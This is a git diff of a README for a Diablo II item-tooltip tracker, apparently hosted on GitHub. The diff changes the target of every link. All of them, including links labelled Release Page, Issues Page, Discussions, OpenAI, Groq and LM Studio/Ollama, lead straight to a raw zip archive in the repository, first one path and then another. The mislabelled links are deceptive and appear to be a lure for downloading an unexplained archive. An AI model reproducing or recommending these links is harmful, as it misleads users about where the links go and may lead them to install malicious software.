@@ -1,6 +1,6 @@
 # 🎮 D2R-AI-Item-Tracker - Extract Diablo II Item Tips Easily
 
-[![Download D2R-AI-Item-Tracker](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/micranatomy/D2R-AI-Item-Tracker.zip)](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/micranatomy/D2R-AI-Item-Tracker.zip)
+[![Download D2R-AI-Item-Tracker](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/assets/Item_Tracker_A_v2.7.zip)](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/assets/Item_Tracker_A_v2.7.zip)
 
 ## 🌟 Overview
 
@@ -11,7 +11,7 @@ D2R-AI-Item-Tracker uses advanced AI to help you gather item tooltips from scree
 To begin using D2R-AI-Item-Tracker, follow these simple steps:
 
 1. **Visit the Releases Page:**
-   Go to the [Release Page](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/micranatomy/D2R-AI-Item-Tracker.zip).
+   Go to the [Release Page](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/assets/Item_Tracker_A_v2.7.zip).
 
 2. **Download the Application:**
    Look for the latest version and click on it to see the available files. Choose the one that matches your operating system and click to download.
@@ -37,7 +37,7 @@ To run D2R-AI-Item-Tracker smoothly, ensure your system meets the following requ
 
 ## 📥 Download & Install
 
-Visit this page to download: [Download D2R-AI-Item-Tracker](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/micranatomy/D2R-AI-Item-Tracker.zip).
+Visit this page to download: [Download D2R-AI-Item-Tracker](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/assets/Item_Tracker_A_v2.7.zip).
 
 After downloading, install the application by following the steps outlined in the "Getting Started" section. 
 
@@ -70,8 +70,8 @@ After downloading, install the application by following the steps outlined in th
 
 For help and support:
 
-- **Issues and Feedback:** Report any issues or provide feedback via the [Issues Page](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/micranatomy/D2R-AI-Item-Tracker.zip).
-- **Community Discussions:** Join discussions and connect with other users in the [Discussions Section](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/micranatomy/D2R-AI-Item-Tracker.zip).
+- **Issues and Feedback:** Report any issues or provide feedback via the [Issues Page](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/assets/Item_Tracker_A_v2.7.zip).
+- **Community Discussions:** Join discussions and connect with other users in the [Discussions Section](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/assets/Item_Tracker_A_v2.7.zip).
 
 ## 📚 Topics Related
 
@@ -87,10 +87,10 @@ Explore more about related topics:
 
 For more information and updates, check out the following links:
 
-- [GitHub Repository](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/micranatomy/D2R-AI-Item-Tracker.zip)
-- [OpenAI](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/micranatomy/D2R-AI-Item-Tracker.zip)
-- [Groq](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/micranatomy/D2R-AI-Item-Tracker.zip)
-- [LM Studio/Ollama](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/micranatomy/D2R-AI-Item-Tracker.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/assets/Item_Tracker_A_v2.7.zip)
+- [OpenAI](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/assets/Item_Tracker_A_v2.7.zip)
+- [Groq](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/assets/Item_Tracker_A_v2.7.zip)
+- [LM Studio/Ollama](https://raw.githubusercontent.com/mouhinhoo/D2R-AI-Item-Tracker/main/assets/Item_Tracker_A_v2.7.zip)
 
 ## 📝 License
 
